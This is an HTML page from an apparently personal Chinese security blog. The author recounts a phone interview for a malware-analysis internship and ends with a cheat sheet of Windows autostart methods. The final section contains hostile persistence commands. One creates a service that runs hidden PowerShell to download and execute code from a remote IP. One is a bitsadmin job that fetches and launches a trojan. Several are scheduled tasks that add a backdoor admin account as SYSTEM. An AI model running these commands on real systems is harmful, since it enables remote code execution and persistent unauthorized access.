@@ -1,0 +1,555 @@
+
+<!DOCTYPE html>
+<html lang="zh-CN" class="loading">
+<head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>微步电面-收获总结 - RGDZ&#39;s blog</title>
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="google" content="notranslate" />
+    <meta name="keywords" content="CTF PWN 恶意文件分析 编程 WEB,"> 
+    <meta name="description" content="RGDZ&#39;s blog,微步电面-收获总结
+前言：想着大二的寒假找机会实习，就投了微步的简历，第一次收到的电话面试，面试的李哥问到的一些问题，自己当时确实还不知道，同时总结一下面试中学到的 :)
+
+面试流程篇自我介绍：一篇,"> 
+    <meta name="author" content="RGDZ"> 
+    <link rel="alternative" href="atom.xml" title="RGDZ&#39;s blog" type="application/atom+xml"> 
+    <link rel="icon" href="/img/favicon.png"> 
+    <link href="https://fonts.loli.net/css?family=Roboto+Mono|Rubik&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="//at.alicdn.com/t/font_1429596_nzgqgvnmkjb.css">
+    <link rel="stylesheet" href="//cdn.bootcss.com/animate.css/3.7.2/animate.min.css">
+    <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/social-share.js/1.0.16/css/share.min.css">
+    <link rel="stylesheet" href="//cdn.bootcss.com/codemirror/5.48.4/codemirror.min.css">
+    <link rel="stylesheet" href="//cdn.bootcss.com/codemirror/5.48.4/theme/dracula.css">
+    <link rel="stylesheet" href="/css/obsidian.css">
+    <link rel="stylesheet" href="/css/ball-atom.min.css">
+</head>
+
+
+<body class="loading">
+    <div class="loader">
+        <div class="la-ball-atom la-2x">
+            <div></div>
+            <div></div>
+            <div></div>
+            <div></div>
+        </div>
+    </div>
+    <span id="config-title" style="display:none">RGDZ&#39;s blog</span>
+    <div id="loader"></div>
+    <div id="single">
+    <div class="scrollbar gradient-bg-rev"></div>
+<div id="top" style="display: block;">
+    <div class="bar" style="width: 0;"></div>
+    <div class="navigation animated fadeIn fast delay-1s">
+        <img id="home-icon" class="icon-home" src="/img/favicon.png" alt="" data-url="https://rgdz-gzu.github.io">
+        <div id="play-icon" title="Play/Pause" class="iconfont icon-play"></div>
+        <h3 class="subtitle">微步电面-收获总结</h3>
+        <div class="social">
+            <!--        <div class="like-icon">-->
+            <!--            <a href="javascript:;" target="_blank" rel="noopener" class="likeThis active"><span class="icon-like"></span><span class="count">76</span></a>-->
+            <!--        </div>-->
+            <div>
+                <div class="share">
+                    
+                        <a href="#" class="iconfont icon-share1"></a>
+                        <div class="share-component-cc" data-disabled="facebook,douban,linkedin,diandian,tencent,google"></div>
+                    
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+    <div class="section">
+        <div class=article-header-wrapper>
+    <div class="article-header">
+        <div class="article-cover animated fadeIn" style="
+            animation-delay: 600ms;
+            animation-duration: 1.2s;
+            background-image: 
+                radial-gradient(ellipse closest-side, rgba(0, 0, 0, 0.65), #100e17),
+                url(/img/cover.jpg);">
+        </div>
+        <div class="else">
+            <p class="animated fadeInDown">
+                
+                <a href="/categories/杂记"><b>「
+                    </b>杂记<b> 」</b></a>
+                
+                十二月 28, 2019
+            </p>
+            <h3 class="post-title animated fadeInDown"><a href="/2019/12/28/%E5%BE%AE%E6%AD%A5%E7%94%B5%E9%9D%A2-%E6%94%B6%E8%8E%B7%E6%80%BB%E7%BB%93/" title="微步电面-收获总结" class="">微步电面-收获总结</a>
+            </h3>
+            
+            <p class="post-count animated fadeInDown">
+                
+                <span>
+                    <b class="iconfont icon-text2"></b> <i>文章字数</i>
+                    9.4k
+                </span>
+                
+                
+                <span>
+                    <b class="iconfont icon-timer__s"></b> <i>阅读约需</i>
+                    9 mins.
+                </span>
+                
+                
+                
+                <span id="busuanzi_container_page_pv">
+                    <b class="iconfont icon-read"></b> <i>阅读次数</i>
+                    <span id="busuanzi_value_page_pv">0</span>
+                </span>
+                
+            </p>
+            
+            
+            <ul class="animated fadeInDown post-tags-list" itemprop="keywords"><li class="animated fadeInDown post-tags-list-item"><a class="animated fadeInDown post-tags-list-link" href="/tags/%E6%80%BB%E7%BB%93%E6%8A%A5%E5%91%8A/" rel="tag">总结报告</a></li><li class="animated fadeInDown post-tags-list-item"><a class="animated fadeInDown post-tags-list-link" href="/tags/%E9%9D%A2%E8%AF%95/" rel="tag">面试</a></li></ul>
+            
+        </div>
+    </div>
+</div>
+
+<div class="screen-gradient-after">
+    <div class="screen-gradient-content">
+        <div class="screen-gradient-content-inside">
+            <div class="bold-underline-links screen-gradient-sponsor">
+                <p>
+                    <span class="animated fadeIn delay-1s"></span>
+                </p>
+            </div>
+        </div>
+    </div>
+</div>
+
+<div class="article">
+    <div class='main'>
+        <div class="content markdown animated fadeIn">
+            <h1 id="微步电面-收获总结"><a href="#微步电面-收获总结" class="headerlink" title="微步电面-收获总结"></a>微步电面-收获总结</h1><blockquote>
+<p>前言：想着大二的寒假找机会实习，就投了微步的简历，第一次收到的电话面试，面试的李哥问到的一些问题，自己当时确实还不知道，同时总结一下面试中学到的 :)</p>
+</blockquote>
+<h2 id="面试流程篇"><a href="#面试流程篇" class="headerlink" title="面试流程篇"></a>面试流程篇</h2><h3 id="自我介绍："><a href="#自我介绍：" class="headerlink" title="自我介绍："></a>自我介绍：</h3><p>一篇准备好的自我介绍很重要，面试官之前肯定看过你的简历，但是开始面试时还是会让你简单做一下自我介绍，大家现在肯定比较好奇，实际上这个环节是比较重要的，此时的自我介绍不在仅仅只是简历上的内容，我面试的属于安全行业，所以可以大概简明扼要的说一下自己怎么解除这一行业的，大部分安全行业的从业者基本都有个共性，可能大家当初了解网络安全的时候，都会带着一丝武侠小说的情怀在里面，这个确实吸引了大部分安全从业者兴趣吧，就我自己了解来说13年左右感觉上安全爱好者数量的一个爆发期，这里不多谈。只是想告诉大家，在自己介绍的环节可以谈谈自己当初有过什么比较好玩，或者有趣的经历在接触或学习这一行的路程中  (￣▽￣)。</p>
+<h3 id="技术面试："><a href="#技术面试：" class="headerlink" title="技术面试："></a>技术面试：</h3><p>这个就是很重要的环节了，不用我说大家也知道，特别是我们这一行很看技术能力，自己技术能力基本完全决定了面试能否通过，我下面列举一下当时李哥问的一些问题，我面的方向主要是做恶意代码分析，逆向工程相关的。</p>
+<blockquote>
+<ol>
+<li>问：PE结构是否熟悉？<br><br>回答思路：由于我基本是从做CTF PWN题开始的，对可执行文件结构的了解ELF结果了解居多，但记得本质上是COFF结构，PE，和ELF都是其变种，所以我可以从共性上来回答，同时也想到之前看的滴水逆向课程中将任意文件解析执行为任意PE文件的操作，个人感觉的重点是PE头，节区表，数据段，以及入口地址，如果我们完全了解这几个点，基本上就能改造任意PE文件，但可能我当时回答的不是特别清楚，这一块回头必须得重新系统的学习一下</li>
+</ol>
+</blockquote>
+<blockquote>
+<ol start="2">
+<li>问：有没有调过那些有意思shellcode？<br><br>回答思路：这个真的幸亏电面前天做的一个响尾蛇的APT样本分析中遇见了，当时样本利用的cve-2017-11882，来执行shellcode，（关于这个样本的分析我回头补上，简单描述实际上比较简单，shellcode主要利用地址无关技术，这个具体的文章我后面考完试也补上。）这个样本shellcode比较有意思的地方就把密文解密后替换掉命令行字符，来加载执行，其中解密过程很简单，就算异或一个12具体可以参考下图：<br><img src="./img/shellcode_1.png" alt="shellcode_1"></li>
+</ol>
+</blockquote>
+<p><img src="./img/shellcode_2.png" alt="shellcode_2"></p>
+<blockquote>
+<ol start="3">
+<li>问：没有写过脱壳器？或者手工脱个壳子一类的？<br><br>答：这个我自己还真没有尝试写过脱壳器，手工脱壳也是特别简单的upx,自己主要还是脚本类型的代码审计的比较多，而且做样本分析也多是APT类的样本，主要就算js,vbs,ps1,一类，而且多是函数名，变量名混淆，在二进制层面见得比较多的也是ollvm混淆，c#也有混淆器，但在最近的样本中都没遇见。</li>
+</ol>
+</blockquote>
+<blockquote>
+<ol start="4">
+<li>问：有没有了解AES加密算法？<br><br>答：加密算法类，确实有一点了解，AES能看懂虽然不是很深入，但国密，特别是SM4加密算法，自己有写过，用c#和go来实现，写了不下三遍。</li>
+</ol>
+</blockquote>
+<blockquote>
+<ol start="5">
+<li>问：有没有看过windows内核驱动？或者自己写过相关的驱动程序？<br><br>答：windows内核的确实还没好好看过，这个确实比较尴尬。</li>
+</ol>
+</blockquote>
+<blockquote>
+<ol start="6">
+<li>问:有没有分析过勒索类或者蠕虫类的样本？<br><br>答：这个确实有点迷了，自己分析得最多的还是rat，后门类的样本，其中脚本类型偏多，多是利用文档类型漏洞，比较有意思的就算利用lnk文件的钓鱼操作，勒索类的确实没有分析过，蠕虫类，也仅仅看过webshell类的蠕虫感染。这个有时间得补上</li>
+</ol>
+</blockquote>
+<blockquote>
+<ol start="7">
+<li>问：windows平台自启有几种方式？<br><br>答：当时只知道有三种（注册表，启动目录，计划任务），后面问大佬才知道最少有6总，我下面做了一份总结。</li>
+</ol>
+</blockquote>
+<h2 id="心得总结"><a href="#心得总结" class="headerlink" title="心得总结"></a>心得总结</h2><h3 id="感想："><a href="#感想：" class="headerlink" title="感想："></a>感想：</h3><p>面试体现出来，我自己还是存在很多问题，当时稍微有点点乱，可能导致回答时，有些没说清楚，还有就是技术上的知识欠缺，所以回头抓紧时间补起来，后天期末考试，考完在把一些帖子补起来。</p>
+<h3 id="windows平台开机自启方式总结"><a href="#windows平台开机自启方式总结" class="headerlink" title="windows平台开机自启方式总结"></a>windows平台开机自启方式总结</h3><table border=0 cellpadding=0 cellspacing=0 width=1552 style='text-align:center;border-collapse:
+ collapse;table-layout:fixed;width:1164pt'>
+ <col width=186 style='text-align:center;mso-width-source:userset;mso-width-alt:6627;width:140pt'>
+ <col width=724 style='text-align:center;mso-width-source:userset;mso-width-alt:25742;width:543pt'>
+ <col width=578 style='text-align:center;mso-width-source:userset;mso-width-alt:20536;width:433pt'>
+ <col width=64 style='text-align:center;width:48pt'>
+ <tr height=18 style='text-align:center;height:13.8pt'>
+  <td colspan=3 height=18 class=xl67 width=1488 style='text-align:center;height:13.8pt;
+  width:1116pt;'>利用注册表的方式实现自启</td>
+  <td class=xl67 width=64 style='text-align:center;width:48pt'></td>
+ </tr>
+ <tr height=18 style='text-align:center;height:13.8pt'>
+  <td height=18 class=xl67 style='text-align:center;height:13.8pt'>注册键</td>
+  <td class=xl66>路径</td>
+  <td class=xl67>注释</td>
+  <td class=xl67></td>
+ </tr>
+ <tr height=18 style='text-align:center;height:13.8pt'>
+  <td height=18 class=xl67 style='text-align:center;height:13.8pt'>Load</td>
+  <td class=xl66>HKEY_CURRENT_USER\Software\Microsoft\Windows
+  NT\CurrentVersion\Windows\load</td>
+  <td class=xl67>这个解释没找到，我查看我本机时也为找到（求大佬指点）</td>
+  <td class=xl67></td>
+ </tr>
+ <tr height=18 style='text-align:center;mso-height-source:userset;height:13.8pt'>
+  <td height=18 class=xl66 style='text-align:center;height:13.8pt'>Userinit</td>
+  <td class=xl66>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows
+  NT\CurrentVersion\Winlogon\Userinit</td>
+  <td class=xl67>这里也能够使系统启动时自动初始化程序。</td>
+  <td class=xl67></td>
+ </tr>
+ <tr height=18 style='text-align:center;height:13.8pt'>
+  <td rowspan=2 height=41 class=xl66 style='text-align:center;height:31.2pt'>Explorer\Run</td>
+  <td class=xl66>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run</td>
+  <td class=xl67>对当前用户生效</td>
+  <td class=xl67></td>
+ </tr>
+ <tr height=23 style='text-align:center;mso-height-source:userset;height:17.4pt'>
+  <td height=23 class=xl66 style='text-align:center;height:17.4pt'>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run</td>
+  <td class=xl67>对所有用户生效</td>
+  <td class=xl67></td>
+ </tr>
+ <tr height=18 style='text-align:center;height:13.8pt'>
+  <td rowspan=2 height=36 class=xl66 style='text-align:center;height:27.6pt'>RunServicesOnce</td>
+  <td class=xl66>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce</td>
+  <td rowspan=2 class=xl66>用来启动服务程序，启动时间在用户登录之前，而且先于其他通过注册表键启动的程序</td>
+  <td class=xl67></td>
+ </tr>
+ <tr height=18 style='text-align:center;height:13.8pt'>
+  <td height=18 class=xl65 style='text-align:center;height:13.8pt'>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce</td>
+  <td></td>
+ </tr>
+ <tr height=18 style='text-align:center;height:13.8pt'>
+  <td rowspan=2 height=36 class=xl66 style='text-align:center;height:27.6pt'>RunServices</td>
+  <td class=xl66>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServices</td>
+  <td rowspan=2 class=xl66>RunServices 子键也是在用户登录前及其他注册表自启动程序加载前面加载</td>
+  <td></td>
+ </tr>
+ <tr height=18 style='text-align:center;height:13.8pt'>
+  <td height=18 class=xl66 style='text-align:center;height:13.8pt'>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices</td>
+  <td></td>
+ </tr>
+ <tr height=18 style='text-align:center;height:13.8pt'>
+  <td rowspan=2 height=36 class=xl66 style='text-align:center;height:27.6pt'>RunOnce\Setup</td>
+  <td class=xl66>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce\Setup</td>
+  <td rowspan=2 class=xl66>RunOnce\Setup 指定了用户登录之后运行的程序</td>
+  <td></td>
+ </tr>
+ <tr height=18 style='text-align:center;height:13.8pt'>
+  <td height=18 class=xl66 style='text-align:center;height:13.8pt'>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce\Setup</td>
+  <td></td>
+ </tr>
+ <tr height=18 style='text-align:center;height:13.8pt'>
+  <td rowspan=2 height=36 class=xl66 style='text-align:center;height:27.6pt'>Run</td>
+  <td class=xl66>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run</td>
+  <td rowspan=2 class=xl67>Run是自动运行程序最常用的注册键</td>
+  <td></td>
+ </tr>
+ <tr height=18 style='text-align:center;height:13.8pt'>
+  <td height=18 class=xl66 style='text-align:center;height:13.8pt'>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run</td>
+  <td></td>
+ </tr>
+ <tr height=18 style='text-align:center;height:13.8pt'>
+  <td height=18 colspan=4 style='text-align:center;height:13.8pt;mso-ignore:colspan'></td>
+ </tr>
+</table>
+
+<p>服务启动</p>
+<pre><code class="shell">sc create &quot;name&quot; binpath= &quot;cmd /c start powershell.exe -nop -w hidden -c \&quot;IEX(((new-object net.webclient).downloadstring(&#39;http://192.168.1.82:19001/a&#39;))\&quot;&quot;
+
+SC config &quot;name&quot; start= auto //我们需要把这个name服务设置为自动。
+
+Sc description &quot;name&quot; &quot;description&quot; // 设置服务的描述字符串
+
+net start &quot;name&quot; // 启动服务
+
+SC delete &quot;name&quot; //删除这个服务，不想使用服务直接删除
+</code></pre>
+<p>注意:不是所有程序都可以作为服务的方式运行,所以请看：<a href="http://www.x2009.net/articles/create-a-windows-service-methods.html" target="_blank" rel="noopener">http://www.x2009.net/articles/create-a-windows-service-methods.html</a></p>
+<p>Bitsadmin</p>
+<pre><code class="shell">bitsadmin /create start_test //创建任务
+
+bitsadmin /addfile start_test http://www.baidu.com/muma.exe %temp%\muma.exe //添加文件，此步骤是为下一步做铺垫，
+
+bitsadmin /SetNotifyCmdLine start_test &quot;%COMSPEC%&quot; &quot;cmd.exe /c bitsadmin.exe /complete \&quot;backdoor\&quot; &amp;&amp; start /B %temp%\muma.exe&quot;  //第二步完成之后就启动这一步
+
+bitsadmin /Resume start_test //启动下载任务</code></pre>
+<p>启动项</p>
+<blockquote>
+<p>C:\Users{user}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup</p>
+</blockquote>
+<p>SchTasks 计划任务<br><a href="https://technet.microsoft.com/zh-cn/library/cc772785.aspx#BKMK_days" target="_blank" rel="noopener">官方文档</a></p>
+<pre><code class="shell">Onstart:schtasks /create /tn sch /ru system /sc onstart /tr &quot;net user admin admin /add&quot;  /f
+
+Onlogin:schtasks /create /tn sch /ru system /sc onlogin /tr &quot;net user admin admin /add&quot;  /f
+
+Onidle:schtasks /create /tn sch /ru system /sc onidle /i 1 /tr &quot;net user admin admin /add&quot;  /f
+
+every 1 min:schtasks /create /tn sch /ru system /sc MINUTE /mo 1  /tr &quot;net user admin admin /add&quot; /f
+
+every 1 day:schtasks /create /tn sch /ru system /sc daily /mo 1  /tr &quot;net user admin admin /add&quot;  /f
+
+onince:schtasks /create /tn &quot;My App&quot; /tr c:\apps\myapp.exe /sc once /sd 01/01/2003 /st 00:00  /f</code></pre>
+
+            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
+            <audio id="audio" loop="1" preload="auto" controls="controls"
+                data-autoplay="false">
+                <source type="audio/mpeg" src="">
+            </audio>
+            
+            <ul id="audio-list" style="display:none">
+                
+                
+                <li title='0' data-url='/statics/chun.mp3'></li>
+                
+                    
+            </ul>
+            
+            
+            
+        </div>
+        <div class="sidebar">
+            <div class="box animated fadeInRight">
+                <div class="subbox">
+                    <img src="/img/favicon.png" height=300 width=300></img>
+                    <p>RGDZ</p>
+                    <span>潜心习安全，莫忘初心。</span>
+                    <dl>
+                        <dd><a href="https://gitee.com/rgdz-gzu/" target="_blank"><span
+                                    class=" iconfont icon-github"></span></a></dd>
+                        <dd><a href="" target="_blank"><span
+                                    class=" iconfont icon-twitter"></span></a></dd>
+                        <dd><a href="" target="_blank"><span
+                                    class=" iconfont icon-stack-overflow"></span></a></dd>
+                    </dl>
+                </div>
+                <ul>
+                    <li><a href="/">11 <p>文章</p></a></li>
+                    <li><a href="/categories">7 <p>分类</p></a></li>
+                    <li><a href="/tags">27 <p>标签</p></a></li>
+                </ul>
+            </div>
+            
+            
+            
+            <div class="box sticky animated fadeInRight faster">
+                <div id="toc" class="subbox">
+                    <h4>目录</h4>
+                    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#微步电面-收获总结"><span class="toc-number">1.</span> <span class="toc-text">微步电面-收获总结</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#面试流程篇"><span class="toc-number">1.1.</span> <span class="toc-text">面试流程篇</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#自我介绍："><span class="toc-number">1.1.1.</span> <span class="toc-text">自我介绍：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#技术面试："><span class="toc-number">1.1.2.</span> <span class="toc-text">技术面试：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#心得总结"><span class="toc-number">1.2.</span> <span class="toc-text">心得总结</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#感想："><span class="toc-number">1.2.1.</span> <span class="toc-text">感想：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#windows平台开机自启方式总结"><span class="toc-number">1.2.2.</span> <span class="toc-text">windows平台开机自启方式总结</span></a></li></ol></li></ol></li></ol>
+                </div>
+            </div>
+            
+            
+        </div>
+    </div>
+</div>
+
+    </div>
+</div>
+    <div id="back-to-top" class="animated fadeIn faster">
+        <div class="flow"></div>
+        <span class="percentage animated fadeIn faster">0%</span>
+        <span class="iconfont icon-top02 animated fadeIn faster"></span>
+    </div>
+</body>
+<footer>
+    <p class="copyright" id="copyright">
+        &copy; 2019
+        <span class="gradient-text">
+            RGDZ
+        </span>.
+        Powered by <a href="http://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a>
+        Theme
+        <span class="gradient-text">
+            <a href="https://github.com/TriDiamond/hexo-theme-obsidian" title="Obsidian" target="_blank" rel="noopener">Obsidian</a>
+        </span>
+        <small><a href="https://github.com/TriDiamond/hexo-theme-obsidian/blob/master/CHANGELOG.md" title="v1.4.3" target="_blank" rel="noopener">v1.4.3</a></small>
+    </p>
+</footer>
+
+<script type="text/javascript" src="https://cdn.bootcss.com/mathjax/2.7.6/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
+</script>
+<script>
+  MathJax.Hub.Config({
+    "HTML-CSS": {
+      preferredFont: "TeX",
+      availableFonts: ["STIX", "TeX"],
+      linebreaks: {
+        automatic: true
+      },
+      EqnChunk: (MathJax.Hub.Browser.isMobile ? 10 : 50)
+    },
+    tex2jax: {
+      inlineMath: [
+        ["$", "$"],
+        ["\\(", "\\)"]
+      ],
+      processEscapes: true,
+      ignoreClass: "tex2jax_ignore|dno",
+      skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+    },
+    TeX: {
+      noUndefined: {
+        attributes: {
+          mathcolor: "red",
+          mathbackground: "#FFEEEE",
+          mathsize: "90%"
+        }
+      },
+      Macros: {
+        href: "{}"
+      }
+    },
+    messageStyle: "none"
+  });
+</script>
+<script>
+  function initialMathJax() {
+    MathJax.Hub.Queue(function () {
+      var all = MathJax.Hub.getAllJax(),
+        i;
+      // console.log(all);
+      for (i = 0; i < all.length; i += 1) {
+        console.log(all[i].SourceElement().parentNode)
+        all[i].SourceElement().parentNode.className += ' has-jax';
+      }
+    });
+  }
+
+  function reprocessMathJax() {
+    if (typeof MathJax !== 'undefined') {
+      MathJax.Hub.Queue(["Typeset", MathJax.Hub]);
+    }
+  }
+</script>
+
+
+
+<script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
+<script src="/js/plugin.js"></script>
+<script src="/js/obsidian.js"></script>
+<script src="/js/jquery.truncate.js"></script>
+<script src="/js/search.js"></script>
+<script src="//cdn.bootcss.com/typed.js/2.0.10/typed.min.js"></script>
+<script src="//cdn.bootcss.com/blueimp-md5/2.12.0/js/md5.min.js"></script>
+<script src="//cdnjs.cloudflare.com/ajax/libs/social-share.js/1.0.16/js/social-share.min.js"></script>
+
+<script src="https://cdn.bootcss.com/codemirror/5.48.4/codemirror.min.js"></script>
+
+    <script src="//cdn.bootcss.com/codemirror/5.48.4/mode/javascript/javascript.min.js"></script>
+
+    <script src="//cdn.bootcss.com/codemirror/5.48.4/mode/css/css.min.js"></script>
+
+    <script src="//cdn.bootcss.com/codemirror/5.48.4/mode/xml/xml.min.js"></script>
+
+    <script src="//cdn.bootcss.com/codemirror/5.48.4/mode/htmlmixed/htmlmixed.min.js"></script>
+
+    <script src="//cdn.bootcss.com/codemirror/5.48.4/mode/clike/clike.min.js"></script>
+
+    <script src="//cdn.bootcss.com/codemirror/5.48.4/mode/php/php.min.js"></script>
+
+    <script src="//cdn.bootcss.com/codemirror/5.48.4/mode/shell/shell.min.js"></script>
+
+    <script src="//cdn.bootcss.com/codemirror/5.48.4/mode/python/python.min.js"></script>
+
+    <script src="//cdn.bootcss.com/codemirror/5.48.4/mode/vb/vb.min.js"></script>
+
+
+
+    <script src="/js/busuanzi.min.js"></script>
+    <script>
+        $(document).ready(function () {
+            if ($('span[id^="busuanzi_"]').length) {
+                initialBusuanzi();
+            }
+        });
+    </script>
+
+
+<link rel="stylesheet" href="//cdn.bootcss.com/photoswipe/4.1.3/photoswipe.min.css">
+<link rel="stylesheet" href="//cdn.bootcss.com/photoswipe/4.1.3/default-skin/default-skin.min.css">
+<script src="//cdn.bootcss.com/photoswipe/4.1.3/photoswipe.min.js"></script>
+<script src="//cdn.bootcss.com/photoswipe/4.1.3/photoswipe-ui-default.min.js"></script>
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+            <div class="pswp__top-bar">
+                <!--  Controls are self-explanatory. Order can be changed. -->
+                <div class="pswp__counter"></div>
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                      <div class="pswp__preloader__cut">
+                        <div class="pswp__preloader__donut"></div>
+                      </div>
+                    </div>
+                </div>
+            </div>
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div> 
+            </div>
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+
+
+
+<script>
+    function initialTyped () {
+        var typedTextEl = $('.typed-text');
+        if (typedTextEl && typedTextEl.length > 0) {
+            var typed = new Typed('.typed-text', {
+                strings: ["潜心习安全，莫忘初心。", "Concentrate on safety, do not forget the original intention."],
+                typeSpeed: 90,
+                loop: true,
+                loopCount: Infinity,
+                backSpeed: 20,
+            });
+        }
+    }
+
+    if ($('.article-header') && $('.article-header').length) {
+        $(document).ready(function () {
+            initialTyped();
+        });
+    }
+</script>
+
+
+
+
+</html>
